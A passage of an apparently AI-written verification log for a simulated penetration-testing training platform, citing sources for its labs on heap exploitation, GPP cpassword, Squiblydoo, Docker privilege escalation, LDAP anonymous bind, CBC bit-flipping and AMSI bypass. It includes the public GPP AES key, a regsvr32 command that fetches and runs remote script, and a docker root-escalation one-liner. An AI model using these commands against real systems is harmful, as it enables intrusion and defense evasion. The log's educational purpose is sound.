  run with no port-default or hand-typed-encoding mistakes this time.

## Sources checked, batch 9 (GPP cpassword, heap unlink, ECB penguin, Swagger leak, Recycle Bin, HSTS)

- **GPP cpassword / MS14-025** — [Microsoft's own MSRC blog: MS14-025 — An Update for Group Policy Preferences](https://www.microsoft.com/en-us/msrc/blog/2014/05/ms14-025-an-update-for-group-policy-preferences),
  [ADSecurity.org: Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288).
  Confirmed the real, specific, and famous fact this lab depends on: Microsoft published the 32-byte AES
  private key for GPP cpassword encryption on MSDN, and it is the same key for every domain everywhere —
  cross-referenced the exact key value (`4e9906e8fcb66cc9faf49310620ffee8f496e806cc57990209b09a433b66c1b`)
  against multiple independent sources (ADSecurity.org, InternalAllTheThings) rather than trusting a single
  recollection, since this is a specific, checkable fact a wrong digit would silently break.
- **Heap unlink exploitation** — [HackTricks: Unlink Attack](https://hacktricks.wiki/en/binary-exploitation/libc-heap/unlink-attack.html),
  [heap-exploitation.dhavalkapil.com: Unlink Exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit).
  Confirmed the real classic mechanism: forging a fake chunk's `bk`/`fd` pointers so that a subsequent
  `free()`-triggered unlink operation performs `fp->bk` written into `bk->fd` (and the reverse) with no
  validation on older/unhardened allocators, turning a doubly-linked-list removal into an attacker-
  controlled arbitrary write.
- **ECB mode / "ECB penguin"** — [tonybox.net: Exploring an Encrypted Penguin with AES-ECB](https://tonybox.net/posts/ecb-penguin/),
  [PentesterLab: ECB Mode Weakness](https://pentesterlab.com/glossary/ecb-mode-weakness).
  Confirmed the real, famous demonstration and its actual point: AES itself is not the problem (a strong,
  correctly-implemented cipher), ECB as a mode of operation is — identical plaintext blocks always produce
  identical ciphertext blocks with zero chaining, which is exactly why large flat-colored image regions
  remain visually recognizable after "encryption."
- **Exposed OpenAPI/Swagger spec** — [Medium (hackersatty): Uncovering Vulnerabilities Through Swagger UI Directory Enumeration](https://hackersatty.medium.com/uncovering-vulnerabilities-through-swagger-ui-directory-enumeration-49e6b43558cd),
  [CloudSEK: Threat Actors Use Exposed Swagger UI to Misuse a Company's Endpoints](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers).
  Confirmed the real default path convention (`/v3/api-docs` for Springdoc/OpenAPI 3) and real documented
  incidents of exactly this pattern: dev-convenience API documentation left enabled in production, revealing
  undocumented internal/admin routes never linked from any client.
- **Recycle Bin $I/$R forensics** — [sethenoka.com: Windows Recycle Bin Forensics — $I/$R Files and Deleted File Metadata](https://sethenoka.com/windows-recycle-bin-forensics-on-windows-10-and-11/),
  [Andrea Fortuna: Windows Forensics — analysis of Recycle bin artifacts](https://andreafortuna.org/2019/09/26/windows-forensics-analysis-of-recycle-bin-artifacts/).
  Confirmed the real $I (metadata: original path, size, deletion timestamp)/$R (actual content) file-pair
  convention introduced in Windows Vista, and that these artifacts are routinely recoverable from
  unallocated space by real forensic tools (Rifiuti2 named specifically) even after the Recycle Bin itself
  has been emptied.
- **Missing HSTS / SSL stripping** — [Palo Alto Networks: What Is an SSL Stripping Attack?](https://www.paloaltonetworks.com/cyberpedia/what-is-an-ssl-stripping-attack),
  [PortSwigger: Strict transport security not enforced](https://portswigger.net/kb/issues/01000300_strict-transport-security-not-enforced).
  Confirmed the real attack window this lab models: a browser's very first request to a domain (not from a
  saved `https://` bookmark) goes out over plain HTTP before any redirect happens, and HSTS specifically
  exists to close that gap by telling the browser to never attempt HTTP again for that domain.

## NEEDS REVIEW (labs/topics), batch 9

- Two more real mistakes caught by verification before commit: (1) the heap-unlink lab's hex-to-decimal
  conversion (`0x603840`) was wrong in the first draft — recomputed with Node, same mistake class flagged
  as a standing risk since Binary Analysis batch 4. (2) The GPP cpassword lab's SYSVOL access objective used
  UNC-path syntax (`smbclient //ip/SYSVOL`) that doesn't match this engine's actual `smbclient`
  implementation, confirmed by reading `engine.ts` — it only accepts a plain IP argument
  (`smbclient <ip>`) and lists whatever shares exist on that host's port-445 service. Fixed to the real
  supported syntax rather than the (more realistic-looking, but non-functional in this simulator) UNC form.
- The port-defaults-to-80 mistake recurred a fifth time this batch (the HSTS lab's port-443 target) —
  fixed and reverified. This is now unambiguously the single most common mistake class across this entire
  expansion; every future lab targeting a non-80/443-without-explicit-port service should treat "did I
  specify the port explicitly" as a mandatory pre-commit check, not an occasional reminder.

## Sources checked, batch 10

- **PBKDF2 iteration counts** — [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).
  Confirmed the 2023 revision's current minimum of 600,000 iterations for PBKDF2-HMAC-SHA256 (up from the
  older 210,000 baseline), and that PBKDF2-HMAC-SHA256 itself remains a sound, real KDF — the defect this
  lab models is purely a stale tuning parameter, not a broken algorithm.
- **GOT overwrite via format string, RELRO** — general, well-established binary exploitation technique
  (format-string arbitrary-write primitive redirecting a GOT entry to attacker-controlled code). Confirmed
  the real, standard mitigation distinction between Partial RELRO (GOT stays writable for the process's
  lifetime — what this lab requires) and Full RELRO (GOT is eagerly resolved and mprotected read-only at
  startup, which would block this exact technique) — a different, complementary condition from this
  session's existing ret2libc lab (NX/ASLR bypass) and heap-unlink lab (allocator metadata corruption),
  none of which overlap mechanically.
- **USN Change Journal ($UsnJrnl:$J) forensics** — well-documented real NTFS artifact: a running log of
  file-level change events (FILE_CREATE, DATA_EXTEND, CLOSE, BASIC_INFO_CHANGE, etc.) maintained
  independently of $MFT's $STANDARD_INFORMATION/$FILE_NAME attributes, and specifically useful for
  cross-referencing against a suspected timestomped file because a timestomping tool edits $SI but
  essentially never also rewrites the separate USN journal history for that file. Confirmed as a distinct
  technique from this session's existing $SI/$FN mismatch timestomping lab (batch 4) — that lab detects
  timestomping via internal MFT-attribute inconsistency, this one detects it via an independent, external
  artifact, which is the real, standard "second source" corroboration technique in practice.
- **Kubernetes `automountServiceAccountToken` default** — well-documented real Kubernetes default
  (`true` unless explicitly set to `false` on the pod or service account), with the token delivered to
  `/var/run/secrets/kubernetes.io/serviceaccount/token` inside every pod. Confirmed the accurate nuance
  that the token alone is normally low-impact against a cluster following least privilege, since a bare
  "default" service account holds no RBAC permissions under modern Kubernetes — the lab deliberately pairs
  the automount default with an explicit, separately-stated permissive ClusterRoleBinding rather than
  implying automount alone is the exploit, to avoid overclaiming.
- **Client-side prototype pollution via URL fragment → DOM XSS** — real, currently-researched vulnerability
  class distinct from JavaScript prototype pollution generally; PortSwigger's DOM Invader tooling exists
  specifically to find this class dynamically, and academic research (2024) has found real gadget chains at
  scale across live sites. Confirmed as mechanically distinct from this session's existing SERVER-SIDE
  settings-merge prototype-pollution-to-RCE lab (`web-prototype-pollution-rce`, in
  `web-session-security-pack.ts`) — that one pollutes via a JSON request body read by server code; this one
  pollutes entirely client-side via `location.hash`, which by HTTP's own design never reaches the server at
  all, making it invisible to every server-side log or defense.
- **PCI DSS log retention** — real PCI DSS Requirement 10.5.1 (numbered 10.7 in PCI DSS v3.2.1): audit log
  history must be retained for at least 12 months, with at least the most recent 3 months (90 days)
  immediately available for analysis. This is the same real retention figure already used narratively
  elsewhere on this platform's SOC/incident-response content, so this lab's numbers are consistent with
  that existing material rather than introducing a conflicting figure.

## NEEDS REVIEW (labs/topics), batch 10

- The client-side prototype pollution / DOM XSS lab cannot be mechanically modeled as a live exploit in this
  engine at all: `TerminalEngine`'s `curl` only ever sees the path and query string of a URL, and a URL
  fragment (everything after `#`) is a client-only construct that real browsers never transmit to a server —
  there is no `location.hash`, no DOM, and no JS execution to simulate here. Modeled as a code-review lab
  (`cat` the vulnerable client JS, `cat` a DOM-Invader-style PoC analysis file) using the same convention
  already established for the ECB-penguin lab in batch 9, rather than faking a live network exploit path
  that wouldn't reflect how this vulnerability class actually manifests.
- No other techniques in this batch required skipping or faking; all six were mechanically modeled with
  full fidelity to how `TerminalEngine` actually works (confirmed by reading the relevant `engine.ts`
  functions before writing each lab, not just assuming prior-batch conventions still applied).

## Sources checked, batch 11 (tcache poisoning, Lambda Function URL, shellbags, Host header poisoning, Squiblydoo, impossible travel)

- **glibc tcache poisoning via a UAF-enabled double-free, defeating the pre-2.32 lack of Safe-Linking** —
  [Check Point Research: Safe-Linking — Eliminating a 20 year-old malloc() exploit primitive](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/),
  [Lanph3re: Heap exploit mitigation in Glibc 2.32 — Safe Linking](https://lanph3re.blogspot.com/2020/08/blog-post.html),
  [HackTricks: Tcache Bin Attack](https://hacktricks.wiki/en/binary-exploitation/libc-heap/tcache-bin-attack.html).
  Confirmed two real, distinct, version-specific facts rather than one general "heap exploitation" claim:
  (1) glibc 2.29 added a per-chunk "key" field written on `free()` specifically to detect a direct
  double-free of the same chunk, and (2) glibc 2.32 added Safe-Linking, which XOR-obfuscates the tcache/
  fastbin freelist's forward pointer with the chunk's own (randomized, ASLR-dependent) address, specifically
  to stop the classic "forge a raw pointer, redirect malloc() anywhere" primitive this lab depends on. This
  lab's binary is deliberately glibc 2.29 (predates Safe-Linking, but does have the key check), and pairs it
  with a separate UAF-write bug that clears the key field before the second free — a combination confirmed
  as the real, standard way modern tcache-poisoning exploits defeat the 2.29-era check when a bare
  double-free isn't directly possible. Deliberately built as Full RELRO (unlike batch 10's Partial-RELRO
  GOT-overwrite lab) so the two Binary Analysis labs are mechanically non-overlapping: one closes off GOT
  overwrite entirely and reaches a different writable target via heap corruption instead.
- **AWS Lambda Function URL public via `authType: NONE`** — [AWS docs: Control access to Lambda function URLs](https://docs.aws.amazon.com/lambda/latest/dg/urls-auth.html),
  [Datadog Security Labs: Lambda function is publicly accessible through function URL](https://securitylabs.datadoghq.com/cloud-security-atlas/vulnerabilities/lambda-function-public-url/),
  [Wiz: Securing AWS Lambda function URLs](https://www.wiz.io/blog/securing-aws-lambda-function-urls).
  Confirmed the exact real mechanism and AWS's own wording: with `authType` set to `NONE`, "Lambda doesn't
  perform any authentication before invoking your function," and the function's resource-based policy is
  what actually grants the public access — this is a real, currently-documented AWS feature (Function URLs
  shipped 2022) and a real, currently-flagged misconfiguration class distinct from every other Cloud lab on
  this platform (IMDSv2, Docker socket, Lambda env-var secrets, Azure SAS, GCP `allUsers`, Kubernetes
  automount) — none of which involve this specific `authType` setting.
- **Windows Shellbags (`BagMRU`) surviving a deleted folder and a removed USB volume** — [Magnet Forensics: Forensic Analysis of Windows Shellbags](https://www.magnetforensics.com/blog/forensic-analysis-of-windows-shellbags/),
  [Pen Test Partners: DFIR tools and techniques for tracing user footprints through Shellbags](https://www.pentestpartners.com/security-blog/dfir-tools-and-techniques-for-tracing-user-footprints-through-shellbags/).
  Confirmed the real registry location (`HKCU\Software\Microsoft\Windows\Shell\BagMRU`), the real mechanism
  (Windows Explorer logs every folder browsed, including on removable media, independent of the
  `$STANDARD_INFORMATION`/`$FILE_NAME`/MFT-based artifacts this session's other Forensics labs rely on), and
  the specific, real forensic value cited across multiple independent sources: shellbags persist even after
  the folder — or the entire volume it lived on — is deleted or disconnected, since the registry entry is
  written at browse-time and never references back to check the target still exists.
- **HTTP Host header injection enabling password reset poisoning** — [PortSwigger Web Security Academy: Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning),
  [OWASP: Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection).
  Confirmed this is PortSwigger's own named vulnerability class with dedicated Academy labs, and the real
  root cause: a password-reset handler that builds the emailed reset link by copying the request's
  attacker-controlled `Host` header instead of using a server-side configured domain. In production the
  forged link's token would only ever be observable via the real outbound email (invisible to network
  logs); this lab pairs the real Host-header bug with a second, separately real anti-pattern (an
  unauthenticated staging mail-capture/QA tool mirroring outgoing email) so the full chain resolves to a
  single request within this engine's stateless request/response model — flagged below under NEEDS REVIEW
  for transparency about that combination, consistent with how this file has handled similar simplifications
  in prior batches.
- **regsvr32.exe "Squiblydoo" application-whitelisting bypass (MITRE ATT&CK T1218.010)** — [MITRE ATT&CK: T1218.010 — System Binary Proxy Execution: Regsvr32](https://attack.mitre.org/techniques/T1218/010/),
  [LOLBAS project: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/),
  [ired.team: regsvr32 aka Squiblydoo](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo).
  Confirmed the real, MITRE-catalogued technique and its actual mechanism: `regsvr32.exe /s /n /u
  /i:<url> scrobj.dll` fetches and executes a remote COM scriptlet without ever registering a COM object or
  writing to the registry, and because `regsvr32.exe` itself is a default-trusted, Microsoft-signed binary,
  a whitelisting policy built around "only signed binaries execute" approves the process without inspecting
  the remote script content — the real reason this bypass earned its "Squiblydoo" nickname in nation-state
  phishing campaigns cited by multiple independent sources.
- **Impossible travel / geo-velocity anomaly detection** — [Datadog: Detect suspicious login activity with impossible travel detection rules](https://www.datadoghq.com/blog/impossible-travel-detection-rules/),
  [ManageEngine Log360: How to Detect Impossible Travel Activity](https://www.manageengine.com/log-management/siem-use-cases/threats/impossible-travel.html).
  Confirmed this is a real, standard, currently-shipped SIEM/UEBA analytic (multiple named commercial
  products implement it as a built-in rule type), and independently recomputed this lab's own numbers with
  Node (a haversine great-circle-distance calculation between Accra and Kyiv, ~5,745.9 km, and the implied
  speed over a 14-minute window, ~24,625 km/h, ~27.4x a commercial jet's cruise speed) rather than trusting
  hand-typed figures, consistent with this file's standing rule about re-deriving any computed value before
  committing it.

## NEEDS REVIEW (labs/topics), batch 11

- The Host header password-reset-poisoning lab combines two separately real bugs into one request/response
  to fit this engine's stateless model: the Host-header-driven link construction (fully real, PortSwigger-
  documented) and an unauthenticated staging mail-capture endpoint surfacing the generated email content
  directly (a separately real, common anti-pattern, but not literally the same request in a true production
  system — there, the forged link would only ever leave via the actual outbound email, requiring a genuine
  mailbox compromise or SMTP-relay-log read to observe). Noted here rather than presented as a single
  atomic real-world request, the same transparency standard applied to the DOM-prototype-pollution
  code-review lab in batch 10 and the GPP cpassword `smbclient` fix in batch 9.
- No other techniques in this batch required skipping or faking; all six were mechanically modeled with
  full fidelity to how `TerminalEngine` actually works, and all six were verified end-to-end with a scripted
  `tsx` run against the real `TerminalEngine` class — full solve path captures exactly one flag per lab, and
  a plausible-but-wrong request per lab captures none.

## Sources checked, batch 12 (Docker GTFOBins, LDAP anonymous bind, CouchDB Admin Party, exposed source map, CBC bit-flipping, AMSI bypass)

This batch was built against an explicit steer: every lab should be something that would work verbatim
against a real Kali box and the described real target, with this platform's `TerminalEngine` understood as
a safe, simulated bridge for practicing that exact command syntax — not a different or simplified
technique. Re-read the "What 'verified' means here" section above before trusting any single citation below
in isolation; it hasn't changed, this batch just leaned harder on it.

- **Docker sudo NOPASSWD / GTFOBins bind-mount privesc** — [GTFOBins: docker](https://gtfobins.org/gtfobins/docker/).
  Confirmed the exact, real, currently-documented command this lab's `gtfobinsArgs` uses verbatim:
  `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`. Reused this platform's existing
  `makePrivescLab()` factory (`src/labs/scenarios/linux-privesc-pack.ts`, now exported for reuse) rather
  than hand-rolling a new host, since this is mechanically the same sudo-NOPASSWD-GTFOBins shape as the
  15 existing `privesc-*` labs — just a new, previously-uncovered binary. Caught during verification: the
  factory's shared `WORDLIST` constant only contains 8 specific passwords, and this lab's initial password
  choice ("Vantage2026!") wasn't one of them, which would have made the lab's own `hydra` objective fail
  against its own wordlist — fixed to `summer2024`, an existing `WORDLIST` entry, before commit.
- **LDAP anonymous bind exposing a password in a user's description field** — [Cobalt: A Pentester Guide to LDAP Bind Method Vulnerabilities](https://www.cobalt.io/blog/pentester-guide-ldap-bind-method-vulnerabilities),
  [HackIndex: LDAP Anonymous Bind – Unauthenticated Data Extraction](https://hackindex.io/services/ldap/exploitation/anonymous-bind).
  Confirmed the real command (`ldapsearch -x -h <dc-ip> -b "dc=corp,dc=local"`, no `-D`/`-w` at all) and the
  specific, real, commonly-cited finding pattern: administrators leaving a plaintext temporary password in
  the freeform `description` attribute, readable by anyone if anonymous bind is enabled. Also confirmed an
  important accuracy nuance and stated it explicitly in the briefing rather than overclaiming: modern
  Active Directory disables anonymous LDAP binds by default (only the Root DSE is queryable anonymously
  out of the box) — this is a real but non-default misconfiguration, framed here as a legacy setting left
  enabled for an old application, not "how AD normally behaves." This engine has no live `ldapsearch`
  command, so — consistent with this file's established convention for output the simulator can't live-
  protocol-simulate — the real command's output is presented via a `cat`-able captured-recon file, with the
  actual command spelled out explicitly in the hint for full real-Kali transferability.
- **Apache CouchDB "Admin Party"** — [CouchDB Blog: The Road to CouchDB 3.0 — Security](https://blog.couchdb.org/2020/02/26/the-road-to-couchdb-3-0-security/),
  [CouchDB: The Definitive Guide — Security](https://guide.couchdb.org/draft/security.html).
  Confirmed the real term and mechanism (CouchDB's pre-3.0 default: no admin account exists until one is
  explicitly created, and until then every unauthenticated request is treated as a full administrator) —
  and caught a real version-accuracy mistake before commit: the lab's first draft used CouchDB 3.2, but
  CouchDB 3.0+ requires an admin password be set before the server will even start, permanently ending
  Admin Party mode. Fixed to CouchDB 2.3.1, a real, common pre-3.0 version, so the scenario's own stated
  software version is consistent with the vulnerability it's demonstrating.
- **Exposed `.js.map` source map leaking a hardcoded key** — [Sentry: Abusing Exposed Sourcemaps](https://blog.sentry.security/abusing-exposed-sourcemaps/),
  [Cybersierra: Are You Leaking Secrets Through React Source Maps?](https://cybersierra.co/blog/secure-react-source-maps/).
  Confirmed the real mechanism (a source map's `sourcesContent` field is the original, un-minified source
  verbatim, and source maps are never linked from the rendered page, so directory brute-forcing or reading
  the bundle's own `//# sourceMappingURL=` comment is genuinely how this gets found) and a real, named
  documented incident matching this exact pattern (a bug-bounty researcher recovering hardcoded Stripe API
  keys from an exposed source map). Modeled with a live `gobuster`-discoverable path (this engine's
  `gobuster`/`ffuf`/`dirsearch` implementation only reports a path as found if it's both a real route on the
  target AND present verbatim in the supplied wordlist file — confirmed by reading `engine.ts`'s `webFuzz()`
  before writing the lab, so the wordlist file provided to the attacker box genuinely has to contain the
  right entry for the objective to work, not just narrate that it would).
- **AES-CBC bit-flipping (no key, no padding oracle)** — [PentesterLab: CBC Bit Flipping Attack](https://pentesterlab.com/glossary/cbc-bit-flipping),
  [Medium (Oly Hossen): Breaking AES-CBC — The Bit-Flipping Attack to Gain Admin Access](https://medium.com/@olyhossen10/breaking-aes-cbc-the-bit-flipping-attack-to-gain-admin-access-a8d64040e962).
  Confirmed the real mechanism (flipping bit N of ciphertext block X flips the same bit of decrypted
  plaintext block X+1, while block X itself decrypts to unrelated garbage) and the real constraint search
  results confirmed explicitly: without a padding oracle, an attacker can only flip existing characters,
  never insert new ones without breaking the block structure — exactly why this lab's design uses two
  fixed-width fields (a sacrificial 16-byte username block, then a fixed `isadmin=0` flag block) rather than
  a variable-length field. Every hex value in this lab (original ciphertext, forged ciphertext, the exact
  byte offset and `0x8c`→`0x8d` change) was computed with real Node `crypto` (`aes-128-cbc`,
  `setAutoPadding(false)`) and the forged value round-trip-verified to decrypt to `isadmin=1AAAAAAA` before
  being hardcoded into the scenario — not hand-typed, consistent with this file's standing rule on computed
  cryptographic values (see the batch-4 and batch-9 heap/hex mistakes this rule exists because of).
- **AMSI bypass via `AmsiUtils.amsiInitFailed` reflection** — [Hacking Articles: A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/),
  [S3cur3Th1sSh1t: Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/).
  Confirmed this is Matt Graeber's original 2016 technique — the oldest publicly documented AMSI bypass —
  and its real mechanism: reflection into `System.Management.Automation.AmsiUtils`'s private, static
  `amsiInitFailed` field, set to `$true` so PowerShell believes AMSI already failed to initialize and skips
  scanning for the rest of the session. Also confirmed the real, current caveat and reflected it honestly in
  the briefing rather than presenting this as a live, undetected technique: Defender has signed this exact
  string since 2017 and reliably detects the un-obfuscated one-liner today — the lab is scoped specifically
  to the *split/concatenated-string obfuscation* around the same underlying reflection call, which is the
  part still doing real evasion work now, not the base technique itself.

## NEEDS REVIEW (labs/topics), batch 12

- The LDAP anonymous bind lab's output is presented via a `cat`-able captured-recon file rather than a live
  `ldapsearch` simulation, since this engine has no LDAP protocol command at all (confirmed by reading
  `KNOWN_COMMANDS` in `engine.ts`) — the same established convention already used for AWS CLI/IAM-policy-
  style recon output in multiple earlier batches. The real command is spelled out explicitly in the
  objective/hint text so it remains directly usable against a real Kali box.
- No other techniques in this batch required skipping or faking; all six were mechanically modeled with
  full fidelity to how `TerminalEngine` actually works (confirmed by reading the relevant `engine.ts`
  functions — `webFuzz()`, `sudo()`, `curl()`'s query-string-stripping path lookup — before writing each
  lab, not assumed from prior-batch conventions), and all six were verified end-to-end with a scripted
  `tsx` run against the real `TerminalEngine` class: full solve path captures exactly one flag per lab
  (two for the multi-stage Docker privesc lab, matching its `totalFlags: 2`), and a plausible-but-wrong
  request per lab captures none. One route-key mistake was caught and fixed during this same verification
  pass: the CouchDB lab's `_all_docs` route was initially keyed with a literal `?include_docs=true` query
  string in the `http` object, which `curl()`'s path-only route lookup (query strings are parsed separately
  and never part of the path match — confirmed by reading `curl()` in `engine.ts`) could never match,
  making the lab's own solve path fail 404 until fixed.
